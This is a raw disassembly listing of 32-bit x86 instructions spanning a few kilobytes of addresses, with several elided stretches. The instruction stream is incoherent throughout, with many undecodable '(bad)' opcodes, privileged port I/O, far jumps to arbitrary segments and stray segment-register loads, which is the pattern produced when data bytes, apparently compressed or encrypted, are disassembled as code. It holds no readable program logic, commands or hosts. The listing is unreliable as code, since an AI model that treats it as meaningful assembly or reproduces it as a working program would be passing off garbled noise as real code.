  422fbc:	test   eax,0x1a6ea837
  422fc1:	lods   al,BYTE PTR ds:[esi]
  422fc2:	mov    ah,0x60
  422fc4:	fiadd  DWORD PTR [ecx+0x7e]
  422fc7:	je     0x422fbb
  422fc9:	inc    eax
  422fca:	aaa    
  422fcb:	jo     0x422f95
  422fcd:	pusha  
  422fce:	gs push esi
  422fd0:	jns    0x422f7c
  422fd2:	scas   al,BYTE PTR es:[edi]
  422fd3:	or     bl,dh
  422fd5:	adc    esi,ebx
  422fd7:	ins    BYTE PTR es:[edi],dx
  422fd8:	dec    ecx
  422fd9:	fcom   st(4)
  422fdb:	push   eax
  422fdc:	xor    eax,0x90b9715b
  422fe1:	ins    BYTE PTR es:[edi],dx
  422fe2:	add    cl,ch
  422fe4:	jo     0x42304a
  422fe6:	sub    DWORD PTR [edx-0x6826cdfb],0x98297d2
  422ff0:	arpl   ax,ax
  422ff2:	out    0x2,eax
  422ff4:	inc    edi
  422ff5:	repnz sub bl,BYTE PTR [edx+eax*1]
  422ff9:	pop    ecx
  422ffa:	pop    ebp
  422ffb:	jbe    0x423007
  422ffd:	js     0x422f9d
  422fff:	stos   BYTE PTR es:[edi],al
  423000:	inc    edi
  423001:	popa   
  423002:	pop    ds
  423003:	leave  
  423004:	aas    
  423005:	cmp    al,0x32
  423007:	fcom   QWORD PTR [eax+0x77]
  42300a:	dec    edx
  42300b:	mov    eax,ds:0x55d60be4
	...
  423074:	inc    esi
  423075:	in     al,0x62
  423077:	mov    dl,ah
  423079:	mov    gs,esi
  42307b:	out    dx,al
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [ebp+ecx*1+0x6075d51d],esp
  423085:	jne    0x423088
  423087:	add    BYTE PTR [ecx+eax*1],al
  42308a:	add    BYTE PTR [eax],al
  42308c:	imul   esp,DWORD PTR [edi+0x4],0x33f2962a
  423093:	sbb    BYTE PTR ds:0xa856e256,bh
  423099:	ret    
  42309a:	aad    0xf1
  42309c:	push   eax
  42309d:	aaa    
  42309e:	and    eax,0x65a02acf
  4230a3:	in     eax,dx
  4230a4:	push   eax
  4230a5:	bound  esp,QWORD PTR [ebp-0xf2eb0e9]
  4230ab:	push   es
  4230ac:	ja     0x4230b2
  4230ae:	mov    ebx,0xc682a685
  4230b3:	das    
  4230b4:	stc    
  4230b5:	outs   dx,BYTE PTR ds:[esi]
  4230b6:	rol    DWORD PTR ds:0x62ee3c54,cl
  4230bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230bd:	lea    esi,[edi+eax*1+0x42]
  4230c1:	shl    DWORD PTR [ebp-0x1b2d092c],0xc9
  4230c8:	inc    ebp
  4230c9:	or     ecx,eax
  4230cb:	pop    edi
  4230cc:	shr    BYTE PTR [edi+esi*8-0x11],0x4d
  4230d1:	clc    
  4230d2:	(bad)  
  4230d3:	push   eax
  4230d4:	stc    
  4230d5:	imul   ebx,DWORD PTR [ebp-0x139dcd1f],0xffffffdf
  4230dc:	sbb    ch,BYTE PTR [esi+0x4]
  4230df:	lods   al,BYTE PTR ds:[esi]
  4230e0:	sub    eax,0x4ef3747d
  4230e5:	out    dx,al
  4230e6:	mov    ds:0xbfbfec88,eax
  4230eb:	pop    ds
  4230ec:	sbb    DWORD PTR [edx+ebp*8-0x69],0xe3161a2f
  4230f4:	mov    esi,0xe8f378db
  4230f9:	pop    esi
  4230fa:	mov    ecx,0xf7ec7cd9
  4230ff:	adc    DWORD PTR [esi],ebp
  423101:	pop    edx
  423102:	pop    DWORD PTR [edx]
  423104:	sub    bl,bl
  423106:	or     DWORD PTR [ebx],ebp
  423108:	arpl   WORD PTR [ecx],cx
  42310a:	mov    esi,0xb23d20cb
  42310f:	add    eax,0x862d20c6
  423114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423115:	stc    
  423116:	sub    cl,BYTE PTR [edx-0x68c3a4a6]
  42311c:	cmp    DWORD PTR [esi+ebx*4+0x1a],0xd107b18a
  423124:	fcomp  QWORD PTR [edi+eax*4-0x26c89aa0]
  42312b:	cld    
  42312c:	lds    ebx,FWORD PTR [ecx+0x5f]
  42312f:	xor    eax,0xe3cec51d
  423134:	loop   0x4230fd
  423136:	(bad)
  423139:	jmp    0x81b94b01
  42313e:	add    al,0x34
  423140:	sub    al,0xc
  423142:	es stos DWORD PTR es:[edi],eax
  423144:	push   edx
  423145:	das    
  423146:	inc    eax
  423147:	add    al,0xce
  423149:	sbb    eax,0xc182ca2
  42314e:	daa    
  42314f:	inc    DWORD PTR [ebp-0x11abdb79]
  423155:	loopne 0x4230d9
  423157:	xchg   ebx,eax
  423158:	pop    edx
  423159:	fs dec esi
  42315b:	enter  0x4f76,0xd7
  42315f:	adc    al,0xa6
  423161:	das    
  423162:	(bad)  
  423163:	repnz sbb BYTE PTR [edi+edx*8-0x5e],al
  423168:	popa   
  423169:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42316a:	mov    ebx,eax
  42316c:	(bad)  
  42316d:	or     al,0xc
  42316f:	xor    esi,DWORD PTR [eax]
  423171:	sahf   
  423172:	pop    edx
  423173:	sahf   
  423174:	jge    0x423197
  423176:	retf   0x51bc
  423179:	scas   eax,DWORD PTR es:[edi]
  42317a:	mov    ds:0x9fb71369,eax
  42317f:	inc    esp
  423180:	inc    ebp
  423181:	mov    ebp,0x6e873e19
  423186:	retf   0xaa02
  423189:	repnz xor eax,0xdba4804f
  42318f:	les    eax,FWORD PTR [eax]
	...
  4231f1:	add    BYTE PTR [eax],al
  4231f3:	add    BYTE PTR [ecx-0xf],bh
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx+0x77342077],esp
  423204:	fs jbe 0x423208
  423207:	add    BYTE PTR [ecx+eax*1],al
  42320a:	add    BYTE PTR [eax],al
  42320c:	pop    edx
  42320d:	mov    ebp,esi
  42320f:	ret    
  423210:	or     BYTE PTR [edx],0x8c
  423213:	iret   
  423214:	icebp  
  423215:	adc    eax,0x218942f1
  42321a:	aad    0x87
  42321c:	push   ss
  42321d:	jmp    0x18ef:0x4f475b0b
  423224:	cmovno eax,DWORD PTR [eax+0x71]
  423228:	(bad)  
  423229:	out    dx,eax
  42322a:	sub    esi,DWORD PTR ds:0xac43cea7
  423230:	(bad)  
  423231:	loope  0x42322d
  423233:	(bad)
  423237:	sbb    ebp,edi
  423239:	pop    esi
  42323a:	xor    esi,esp
  42323c:	ss mov esp,edi
  42323f:	test   eax,0x797e09d9
  423244:	(bad)  
  423245:	ins    DWORD PTR es:[edi],dx
  423246:	inc    eax
  423247:	imul   BYTE PTR [edi-0x21]
  42324a:	pop    ebx
  42324b:	add    esp,esi
  42324d:	dec    eax
  42324f:	ds dec di
  423252:	imul   eax,DWORD PTR [eax],0x6ba56f72
  423258:	popf   
  423259:	std    
  42325a:	jbe    0x4231e1
  42325c:	enter  0x32b9,0x35
  423260:	data16 lods al,BYTE PTR ds:[esi]
  423262:	outs   dx,BYTE PTR ds:[esi]
  423263:	nop
  423264:	retf   
  423265:	adc    DWORD PTR [edx-0x3fe19e55],0x8c9cdd9d
  42326f:	lods   eax,DWORD PTR ds:[esi]
  423270:	mov    edx,0xdad499c9
  423275:	push   esi
  423276:	lods   al,BYTE PTR ds:[esi]
  423277:	cmp    DWORD PTR gs:[esi],edx
  42327a:	xor    ch,BYTE PTR ds:0xb6d7c280
  423280:	xor    eax,0x7b26ee53
  423285:	xchg   ecx,eax
  423286:	mov    BYTE PTR gs:[ecx-0x55],0x87
  42328b:	inc    eax
  42328d:	add    DWORD PTR [esi-0xa],esi
  423290:	jne    0x4232cf
  423292:	(bad)  
  423293:	jbe    0x423232
  423295:	ja     0x423297
  423297:	test   al,0x6c
  423299:	neg    ch
  42329b:	or     ecx,DWORD PTR [ebx]
  42329d:	mov    eax,ds:0x6eec03f8
  4232a2:	ret    0x8489
  4232a5:	sbb    eax,0x539fc292
  4232aa:	sar    DWORD PTR [edx-0x675705b2],0x19
  4232b1:	add    DWORD PTR [esi-0x3f9052b9],0x7d
  4232b8:	jns    0x4232e2
  4232ba:	and    eax,0x4135cc41
  4232bf:	je     0x4232f3
  4232c1:	sbb    DWORD PTR [esp+esi*4-0x2a],edi
  4232c5:	pop    ebp
  4232c6:	sub    ebx,DWORD PTR ds:0xd7b9409
  4232cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232cd:	arpl   WORD PTR [ebp-0x68],bx
  4232d0:	cmp    eax,0x41d2c49
  4232d5:	and    DWORD PTR [edx-0x16],ebp
  4232d8:	mov    ecx,0xc4e82326
  4232dd:	and    dh,dh
  4232df:	mov    edx,0xc3ae6de
  4232e4:	jge    0x4232bd
  4232e6:	mov    ecx,0x98b54dac
  4232eb:	xor    al,BYTE PTR [ebp-0x5e07c76f]
  4232f1:	cmp    BYTE PTR [edx-0x2f],ch
  4232f4:	adc    dh,dh
  4232f6:	mov    ds:0xfbe0a8da,al
  4232fb:	cmp    al,0xd3
  4232fd:	sbb    al,0xc6
  4232ff:	add    eax,0x6de32856
  423304:	sub    ecx,DWORD PTR [ebp+0x33]
  423307:	mov    al,0x15
  423309:	test   al,0xad
  42330b:	sub    al,0x3d
  42330d:	fnsave ds:0x3c
	...
  423373:	add    al,bh
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0xfeae0f44
  423382:	jp     0x423308
  423384:	push   0x4000177
  423389:	add    DWORD PTR [eax],eax
  42338b:	add    BYTE PTR [eax+0x3b],al
  42338e:	pushf  
  42338f:	dec    edi
  423390:	push   ebx
  423391:	xchg   esp,eax
  423392:	sub    bl,BYTE PTR [edi-0x46]
  423395:	or     ecx,esi
  423397:	push   edi
  423398:	jecxz  0x423419
  42339a:	fisttp WORD PTR [esi]
  42339c:	pop    ecx
  42339d:	fidiv  DWORD PTR [ebx-0x5291eb59]
  4233a3:	inc    ebp
  4233a4:	test   DWORD PTR [esi],edx
  4233a6:	stos   DWORD PTR es:[edi],eax
  4233a7:	xchg   edi,eax
  4233a8:	push   ebx
  4233a9:	arpl   WORD PTR [edx],bx
  4233ab:	jbe    0x4233b2
  4233ad:	or     eax,0x538073d0
  4233b2:	add    cl,BYTE PTR [ebp+0x73a9f130]
  4233b8:	pop    ds
  4233b9:	cmc    
  4233ba:	pop    ss
  4233bb:	(bad)  
  4233bc:	mul    dl
  4233be:	arpl   WORD PTR [eax+0x789bb541],bp
  4233c4:	jo     0x4233d3
  4233c6:	je     0x4233cb
  4233c8:	add    ecx,ebx
  4233ca:	jne    0x423417
  4233cc:	cld    
  4233cd:	sub    BYTE PTR [ebx+0x40],dl
  4233d0:	jne    0x423419
  4233d2:	lock int3 
  4233d4:	push   ebx
  4233d5:	pop    esi
  4233d6:	jecxz  0x4233d5
  4233d8:	mov    dl,0xc0
  4233da:	dec    edi
  4233db:	add    BYTE PTR [edx-0x5dc3f0ae],ch
  4233e1:	add    ch,0x44
  4233e4:	loope  0x423435
  4233e6:	mov    cl,0xd3
  4233e8:	sub    DWORD PTR [esi+0x3ff0b0aa],edx
  4233ee:	out    0xed,eax
  4233f0:	es push 0xffffffd8
  4233f3:	mov    dl,0xbc
  4233f5:	fcomi  st,st(4)
  4233f7:	mov    ss,eax
  4233f9:	mov    ds:0xc956ef19,al
  4233fe:	(bad)  
  4233ff:	cmp    eax,0x437b882d
  423404:	pop    edx
  423405:	(bad)  [ecx+0x2e58d3e9]
  42340b:	outs   dx,DWORD PTR ds:[esi]
  42340c:	sub    ebx,DWORD PTR [edx-0x45]
  42340f:	xor    eax,0x44899ab9
  423414:	aam    0xa7
  423416:	inc    ebx
  423417:	dec    eax
  423418:	dec    ebx
  423419:	cmc    
  42341a:	inc    eax
  42341b:	into   
  42341c:	(bad)  
  42341e:	inc    eax
  42341f:	xchg   edx,eax
  423420:	(bad)  
  423421:	sahf   
  423422:	cld    
  423423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423424:	inc    ebx
  423425:	xor    dh,BYTE PTR [ecx-0x2d9bd1e5]
  42342b:	push   0x5790ea55
  423430:	or     cl,ah
  423432:	stc    
  423433:	dec    esp
  423434:	add    BYTE PTR gs:[edi-0x726d3a5d],0x89
  42343c:	iret   
  42343d:	mov    cl,0xad
  42343f:	cmc    
  423440:	mov    ch,0x8a
  423442:	outs   dx,DWORD PTR ds:[esi]
  423443:	loop   0x42348e
  423445:	adc    al,0x77
  423447:	popf   
  423448:	clc    
  423449:	cld    
  42344a:	lahf   
  42344b:	push   ecx
  42344c:	jge    0x423432
  42344e:	pop    ebx
  42344f:	adc    bh,BYTE PTR [bx+di]
  423452:	int3   
  423453:	jmp    0x84d1:0x993fdf05
  42345a:	out    0x34,al
  42345c:	xchg   ebp,eax
  42345d:	xor    eax,DWORD PTR [edx-0x70]
  423460:	div    DWORD PTR [ecx-0x7f]
  423463:	mov    edi,0x80f863ad
  423468:	ficomp DWORD PTR [eax+0x14731dcc]
  42346e:	dec    eax
  42346f:	mov    al,ds:0x1067e47d
  423474:	pushf  
  423475:	dec    BYTE PTR gs:[edx-0x1ca959e1]
  42347c:	imul   ecx,edx,0x30
  42347f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423480:	lods   eax,DWORD PTR ds:[esi]
  423481:	data16 mov ss,WORD PTR [esi+ebp*4+0x24b5b912]
  423489:	jbe    0x4234ab
  42348b:	push   0x4b
  42348d:	jecxz  0x4234be
  42348f:	and    DWORD PTR [eax],eax
	...
  4234f1:	add    BYTE PTR [eax],al
  4234f3:	add    al,al
  4234f5:	mov    al,0x45
  4234f7:	outs   dx,DWORD PTR ds:[esi]
  4234f8:	jne    0x4234f9
  4234fa:	jmp    0x921f:0xadf467bf
  423501:	call   0x78aed374
  423506:	add    DWORD PTR [eax],eax
  423508:	add    al,0x1
  42350a:	add    BYTE PTR [eax],al
  42350c:	cmp    ch,ah
  42350e:	sbb    DWORD PTR [edi+0x19],0xde5e9d4b
  423515:	jle    0x423578
  423517:	cmc    
  423518:	dec    eax
  423519:	mov    edi,0x97cb2652
  42351e:	pusha  
  42351f:	xor    al,BYTE PTR [ebx+0x3aef83cf]
  423525:	inc    eax
  423526:	rcr    DWORD PTR [ecx+0x4d],cl
  423529:	lods   eax,DWORD PTR ds:[esi]
  42352a:	jno    0x4234f8
  42352c:	lahf   
  42352d:	dec    ebp
  42352e:	push   eax
  42352f:	push   edi
  423530:	shr    BYTE PTR [ecx],1
  423532:	mov    ds:0x5ae07657,al
  423537:	mov    al,0x49
  423539:	jbe    0x423510
  42353b:	mov    ebx,0x5ea37bb4
  423540:	test   BYTE PTR [eax],ah
  423542:	mov    gs,WORD PTR [edi+ebp*1]
  423545:	dec    ebp
  423546:	fsub   QWORD PTR [edi+ebx*1+0x4a5d170d]
  42354d:	pusha  
  42354e:	stos   DWORD PTR es:[edi],eax
  42354f:	repnz adc esi,ebp
  423552:	mov    esi,0xb19c308
  423557:	aam    0xf5
  423559:	out    dx,al
  42355a:	ror    BYTE PTR ds:0x5c57bfea,1
  423560:	mov    edi,0xcd34b5a0
  423565:	adc    BYTE PTR [ebx-0x27239b94],dh
  42356b:	outs   dx,BYTE PTR ds:[esi]
  42356c:	scas   al,BYTE PTR es:[edi]
  42356d:	dec    ecx
  42356e:	push   cs
  42356f:	shl    BYTE PTR [eax+0x4e04e39],0xb8
  423576:	mov    al,0xa1
  423578:	jg     0x42356d
  42357a:	repnz mov eax,0x111bc903
  423580:	adc    al,0xad
  423582:	imul   ebx,DWORD PTR [eax-0x40690039],0x2a2129b3
  42358c:	addr16 pop es
  42358e:	(bad)  
  42358f:	and    al,0x9d
  423591:	pop    edi
  423592:	jae    0x42359a
  423594:	int    0x0
  423596:	sub    ebp,DWORD PTR [ebx]
  423598:	mov    al,ds:0x137d3e4
  42359d:	adc    eax,0xb657de3e
  4235a2:	push   ebx
  4235a3:	(bad)  
  4235a4:	data16 xor ah,BYTE PTR [esi]
  4235a7:	jnp    0x42360d
  4235a9:	jp     0x423534
  4235ab:	std    
  4235ac:	frstor [esi-0x35]
  4235af:	into   
  4235b0:	xchg   esi,eax
  4235b1:	lds    ecx,FWORD PTR [ecx-0x2698a43c]
  4235b7:	jo     0x4235c3
  4235b9:	push   ss
  4235ba:	in     al,0x1a
  4235bc:	std    
  4235bd:	sub    DWORD PTR [eax+ebp*8+0x65],ebx
  4235c1:	jmp    edi
  4235c3:	lea    esi,[edi-0x74d1ba59]
  4235c9:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4235cb:	inc    esp
  4235cc:	mov    WORD PTR [edx+0x49],cs
  4235cf:	repz imul edx,DWORD PTR ss:[ebx],0x7e
  4235d4:	sub    bh,bh
  4235d6:	adc    eax,DWORD PTR [edi+ebx*2]
  4235d9:	sub    eax,0x11c1fc03
  4235df:	fstp   TBYTE PTR [ebp+eiz*1+0x5d3c9563]
  4235e6:	std    
  4235e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235e8:	les    esi,FWORD PTR [edi+0x1d1152da]
  4235ee:	test   eax,0x1c55d912
  4235f3:	pushf  
  4235f4:	into   
  4235f5:	pusha  
  4235f6:	or     al,0xe6
  4235f8:	xchg   edx,eax
  4235f9:	es xchg ebp,eax
  4235fb:	sahf   
  4235fc:	mov    ds:0xbbfcf8a3,al
  423601:	adc    DWORD PTR [ebx],eax
  423603:	sub    dh,bl
  423605:	ins    BYTE PTR es:[edi],dx
  423606:	out    dx,eax
  423607:	and    al,0x32
  423609:	cwde   
  42360a:	mov    ds:0x20f80a51,al
  42360f:	fld    QWORD PTR [eax]
	...
  423671:	add    BYTE PTR [eax],al
  423673:	add    BYTE PTR [eax+0x7f747c8f],al
  423679:	test   DWORD PTR [eax+0x7c916eff],0xa25db913
  423683:	xor    dh,BYTE PTR [eax+0x79]
  423686:	add    DWORD PTR [eax],eax
  423688:	add    al,0x1
  42368a:	add    BYTE PTR [eax],al
  42368c:	test   eax,0xb6136dec
  423691:	jae    0x4236a4
  423693:	mov    esp,DWORD PTR [eax+0x4f]
  423696:	xor    al,0x9c
  423698:	sub    DWORD PTR [edi+ecx*2-0x2f],0xb80b18db
  4236a0:	xchg   esp,eax
  4236a1:	add    DWORD PTR [edx+0x3bcaf1a2],edi
  4236a7:	mov    ch,0x9d
  4236a9:	and    BYTE PTR [eax+0x62],0xc7
  4236ad:	je     0x423716
  4236af:	pushf  
  4236b0:	jmp    0x987a:0x9b835e10
  4236b7:	add    dl,BYTE PTR [eax+0x13a12aa0]
  4236bd:	push   edi
  4236be:	lods   al,BYTE PTR ds:[esi]
  4236bf:	adc    al,0x42
  4236c2:	push   ecx
  4236c3:	stos   BYTE PTR es:[edi],al
  4236c4:	add    al,0xcb
  4236c6:	mov    esp,0x3c1b36ba
  4236cb:	jp     0x4236e9
  4236cd:	iret   
  4236ce:	xchg   edx,eax
  4236cf:	xchg   edi,eax
  4236d0:	cmp    BYTE PTR [eax-0x12],cl
  4236d3:	fild   WORD PTR [esi+eiz*1+0x2]
  4236d7:	cmp    al,0x66
  4236d9:	fsub   DWORD PTR [ebp+ebp*4+0x4]
  4236dd:	outs   dx,BYTE PTR ds:[esi]
  4236de:	fistp  WORD PTR [edx+0x18]
  4236e1:	dec    ebx
  4236e2:	lea    eax,[ebx-0x5a2e53e4]
  4236e8:	or     al,BYTE PTR [edx-0x32]
  4236eb:	lea    edx,[esi-0x523ee682]
  4236f1:	sbb    BYTE PTR [eax+0x1d],bl
  4236f4:	mov    dh,0x9b
  4236f6:	inc    ebp
  4236f7:	out    0x30,eax
  4236f9:	pop    edi
  4236fa:	es das 
  4236fc:	(bad)
  4236ff:	adc    BYTE PTR [edi+edi*4+0x9],0x6f
  423704:	lods   eax,DWORD PTR ds:[esi]
  423705:	sbb    al,0x51
  423707:	xor    al,0xa4
  423709:	lds    edx,FWORD PTR [edi]
  42370b:	(bad)  
  42370d:	stos   BYTE PTR es:[edi],al
  42370e:	inc    edi
  42370f:	dec    esi
  423710:	test   al,0x7c
  423712:	fxch   st(1)
  423714:	xor    DWORD PTR [esi+0x60],ebx
  423717:	add    bh,ch
  423719:	dec    esp
  42371a:	nop
  42371b:	xor    edx,DWORD PTR [eax-0x4e]
  42371e:	cli    
  42371f:	jnp    0x4236a9
  423721:	sbb    cl,bh
  423723:	rcr    ch,cl
  423725:	push   0x57317b1e
  42372a:	sbb    edi,DWORD PTR [eax-0x3c]
  42372d:	repz rol ah,cl
  423730:	std    
  423731:	cmp    eax,0x3535f1cc
  423736:	icebp  
  423737:	push   esp
  423738:	aad    0x64
  42373a:	xchg   ecx,eax
  42373b:	mov    ebp,0x773096f4
  423740:	test   eax,0xd37f3850
  423745:	(bad)  
  423746:	fdiv   DWORD PTR [eax-0x4624351b]
  42374c:	fst    st(4)
  42374e:	mov    eax,0xa8cd4116
  423753:	movaps xmm1,XMMWORD PTR [eax-0x74d905a1]
  42375a:	pushf  
  42375b:	neg    DWORD PTR [eax+0x4dc865f3]
  423761:	xchg   esp,eax
  423762:	imul   ecx,DWORD PTR [edi],0x7e
  423765:	adc    esp,DWORD PTR ss:[ecx-0xa]
  423769:	dec    esi
  42376a:	push   edx
  42376b:	retf   
  42376c:	test   DWORD PTR [ebx+0x75b1c1d9],esp
  423772:	test   eax,0x67748ac4
  423777:	(bad)  
  423778:	mov    esp,DWORD PTR [edx]
  42377a:	div    DWORD PTR [edx+0x4b]
  42377d:	push   0x29bbc6a
  423782:	ss inc ebx
  423784:	int3   
  423785:	aaa    
  423786:	aad    0x77
  423788:	or     ebp,eax
  42378a:	or     edx,edx
  42378c:	jne    0x4237aa
  42378e:	mov    ds:0x6d,eax
	...
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7a74:0x97b3bcec
  423806:	add    DWORD PTR [eax],eax
  423808:	add    al,0x1
  42380a:	add    BYTE PTR [eax],al
  42380c:	getsec 
  42380e:	fistp  DWORD PTR [edx+0x26]
  423811:	mov    edx,0xe133c33
  423816:	int3   
  423817:	mov    ebx,0x77e3654f
  42381c:	retf   0x6ee0
  42381f:	cmc    
  423820:	dec    ecx
  423821:	les    edx,FWORD PTR [esi+esi*8]
  423824:	shl    DWORD PTR [edx-0x23],cl
  423827:	and    DWORD PTR [edi+0x34],esp
  42382a:	pop    esi
  42382b:	and    eax,0x8490adfa
  423830:	jo     0x4237f6
  423832:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423833:	xor    BYTE PTR [ecx-0x18],al
  423836:	aam    0x13
  423838:	shl    BYTE PTR [esi-0x539863b3],0xc1
  42383f:	push   ds
  423840:	inc    ecx
  423841:	xor    cl,BYTE PTR [ebx+ebx*4]
  423844:	adc    eax,0x63315ca8
  423849:	xor    cl,ah
  42384b:	ldmxcsr DWORD PTR [eax]
  42384e:	pop    eax
  42384f:	scas   al,BYTE PTR es:[edi]
  423850:	sti    
  423851:	push   eax
  423852:	dec    ebx
  423853:	sbb    al,0xa6
  423855:	rcr    ebx,0xfa
  423858:	sub    ebx,DWORD PTR [ebx]
  42385a:	popf   
  42385b:	out    0x56,eax
  42385d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42385e:	retf   
  42385f:	sahf   
  423860:	or     DWORD PTR [edx+0x36861fa3],esp
  423866:	std    
  423867:	or     edi,edx
  423869:	ins    BYTE PTR es:[edi],dx
  42386a:	mov    dl,0xb0
  42386c:	into   
  42386d:	jo     0x423897
  42386f:	ins    DWORD PTR es:[edi],dx
  423870:	test   DWORD PTR [eax-0x393cde03],ebp
  423876:	cmp    BYTE PTR [edi+0x6a],al
  423879:	lods   eax,DWORD PTR ds:[esi]
  42387a:	adc    eax,0xa7fc0409
  42387f:	call   esp
  423881:	sub    eax,0xc5ec32b4
  423886:	repz mov bl,0x4e
  423889:	mov    cl,0xb5
  42388b:	hlt    
  42388c:	push   esi
  42388d:	cmp    DWORD PTR [esi+0x589020c6],edi
  423893:	out    dx,al
  423894:	and    esp,DWORD PTR [eax+esi*2]
  423897:	push   0xa785ffc0
  42389c:	nop
  42389d:	pop    ds
  42389e:	xchg   BYTE PTR [ecx+0x75],bl
  4238a1:	and    eax,0x54238d32
  4238a6:	push   esp
  4238a7:	mov    ebp,0x9108772f
  4238ac:	mov    ch,BYTE PTR [ebp+0x48d9ac9d]
  4238b2:	ins    DWORD PTR es:[di],dx
  4238b4:	sub    esp,DWORD PTR [esi]
  4238b6:	stos   BYTE PTR es:[edi],al
  4238b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238b8:	gs daa 
  4238ba:	add    edx,DWORD PTR [edx-0x64]
  4238bd:	sbb    al,0x24
  4238bf:	sti    
  4238c0:	pop    ecx
  4238c1:	dec    esi
  4238c2:	mov    eax,DWORD PTR [esi+0x78c9c5fc]
  4238c8:	sbb    al,0x2c
  4238ca:	div    eax
  4238cc:	inc    eax
  4238cd:	mov    dl,0xc9
  4238cf:	push   ds
  4238d0:	and    DWORD PTR [ebp-0x55],esp
  4238d3:	fldenv [ebx+eiz*1+0x2c455290]
  4238da:	les    ebp,FWORD PTR [esi-0x5de55c44]
  4238e0:	cpuid  
  4238e2:	add    esp,DWORD PTR [ebp+eiz*8-0x268aca44]
  4238e9:	es fs push edx
  4238ec:	(bad)  
  4238ed:	sbb    eax,0x3ecaae59
  4238f2:	jg     0x42396b
  4238f4:	out    dx,eax
  4238f5:	dec    ecx
  4238f6:	fdiv   QWORD PTR [edi+0x3c67b460]
  4238fc:	pop    esp
  4238fd:	cmp    DWORD PTR [esi+0x31eeccaf],ecx
  423903:	adc    bl,BYTE PTR cs:[ecx+esi*2]
  423907:	and    ebx,DWORD PTR [edx-0x1035dd78]
  42390d:	js     0x423982
  42390f:	pop    edi
	...
  423974:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0x74d22bbd
  423982:	xor    dl,BYTE PTR [eax+edi*2]
  423985:	jnp    0x423988
  423987:	add    BYTE PTR [ecx+eax*1],al
  42398a:	add    BYTE PTR [eax],al
  42398c:	jae    0x423a09
  42398e:	xchg   al,dh
  423990:	stos   BYTE PTR es:[edi],al
  423991:	test   edx,0x788fdcba
  423997:	jecxz  0x4239db
  423999:	dec    edi
  42399a:	mov    al,BYTE PTR [eax+0x6f]
  42399d:	and    al,0xd3
  42399f:	sbb    bh,BYTE PTR [edx+0xac4191d]
  4239a5:	mov    edi,0x3215fe0f
  4239aa:	aad    0xa1
  4239ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239ad:	int    0x4
  4239af:	xor    bl,BYTE PTR [eax+0x325269fb]
  4239b5:	repz out 0xb8,eax
  4239b8:	sub    bl,cl
  4239ba:	jnp    0x423a12
  4239bc:	aam    0xa3
  4239be:	mov    esi,0xddd546d8
  4239c3:	pop    esi
  4239c4:	pop    ds
  4239c5:	out    0x29,eax
  4239c7:	xchg   DWORD PTR [esi+0x3b103749],edi
  4239cd:	push   esi
  4239ce:	das    
  4239cf:	in     al,dx
  4239d0:	test   BYTE PTR [ecx+0xf137203],0xc9
  4239d7:	xor    eax,0x8ca6a298
  4239dc:	cwde   
  4239dd:	and    eax,0x52abd3dd
  4239e2:	inc    edx
  4239e3:	fbstp  TBYTE PTR [edx+0x2e]
  4239e6:	hlt    
  4239e7:	xchg   BYTE PTR [ecx+0x7f88914c],cl
  4239ed:	jae    0x423a5d
  4239ef:	shl    BYTE PTR [ecx+0x7d318b10],1
  4239f5:	(bad)
  4239f9:	ja     0x4239a6
  4239fb:	(bad)  
  4239fc:	fist   DWORD PTR [ebp-0x6a]
  4239ff:	bound  ebx,QWORD PTR [ecx+ebx*1+0x38d494ed]
  423a06:	rol    BYTE PTR [esi],0xc1
  423a09:	add    BYTE PTR [ebx-0x7d],cl
  423a0c:	push   cs
  423a0d:	enter  0x2dd0,0x5b
  423a11:	cli    
  423a12:	ficomp DWORD PTR [edx+0x548d58ef]
  423a18:	inc    eax
  423a19:	out    dx,al
  423a1a:	mov    ecx,0xffa40aa6
  423a1f:	or     al,0x6e
  423a21:	shr    BYTE PTR [edi-0x78ddc5a7],cl
  423a27:	jmp    0x423a46
  423a29:	shl    BYTE PTR [ecx],cl
  423a2b:	nop    DWORD PTR [eax]
  423a2e:	mov    bl,0xeb
  423a30:	and    ecx,DWORD PTR [ebx+0x70f3d7ef]
  423a36:	push   ebp
  423a37:	imul   ecx,DWORD PTR [ebp+0x7a],0x3a
  423a3b:	mov    ebx,0x8fff02ca
  423a40:	dec    edi
  423a41:	imul   esp,DWORD PTR [edx-0x1cf2f51b],0x709b366c
  423a4b:	pop    esp
  423a4c:	add    BYTE PTR [esp+edi*8+0x38],bh
  423a50:	fbld   TBYTE PTR [ecx-0x71]
  423a53:	shl    DWORD PTR [edi-0x6a],0x10
  423a57:	sbb    al,0x63
  423a59:	xchg   edx,eax
  423a5a:	mov    edx,DWORD PTR [ebp-0x1538deac]
  423a60:	or     eax,0x62573040
  423a65:	rcl    BYTE PTR [edi-0x103afee8],1
  423a6b:	mov    esi,0xd2a779ab
  423a70:	push   ss
  423a71:	mov    eax,0xd55f50da
  423a76:	imul   ebx,edx,0xffffffb8
  423a79:	sub    edx,DWORD PTR [edx+ebx*1]
  423a7c:	pop    esi
  423a7d:	retf   
  423a7e:	add    esi,DWORD PTR [edx+0x5f]
  423a81:	shr    DWORD PTR [esi],cl
  423a83:	push   es
